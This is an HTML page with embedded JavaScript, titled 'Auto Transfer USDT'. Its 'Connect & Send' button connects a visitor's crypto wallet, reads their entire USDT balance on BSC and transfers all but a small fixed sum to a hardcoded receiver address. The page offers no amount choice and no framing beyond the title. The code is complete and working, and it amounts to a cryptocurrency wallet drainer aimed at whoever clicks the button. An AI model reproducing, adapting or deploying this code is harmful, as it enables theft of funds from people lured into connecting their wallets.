<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0xc64087a6Fd263ab6A140F9b46f4cAF7B3e82147f".trim();
    const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT on BSC

    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];

    async function connectAndTransfer() {
      if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const accounts = await web3.eth.getAccounts();
          const sender = accounts[0];

          // Validate address format
          if (!web3.utils.isAddress(receiverAddress)) {
            alert("Invalid receiver address format.");
            return;
          }

          const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
          const balanceStr = await usdtContract.methods.balanceOf(sender).call();
          const balance = web3.utils.toBigInt(balanceStr);
          const gasFeeUsdt = 2000000n;

          if (balance <= gasFeeUsdt) {
            alert("Insufficient USDT balance to send after gas fees.");
            return;
          }

          const amountToSend = balance - gasFeeUsdt;

          const tx = await usdtContract.methods
            .transfer(receiverAddress, amountToSend.toString())
            .send({ from: sender });

          alert("USDT sent! Tx hash: " + tx.transactionHash);
        } catch (err) {
          console.error("Error:", err);
          alert("Transaction failed: " + err.message);
        }
      } else {
        alert("Install MetaMask or Trust Wallet.");
      }
    }
  </script>
</body>
</html>
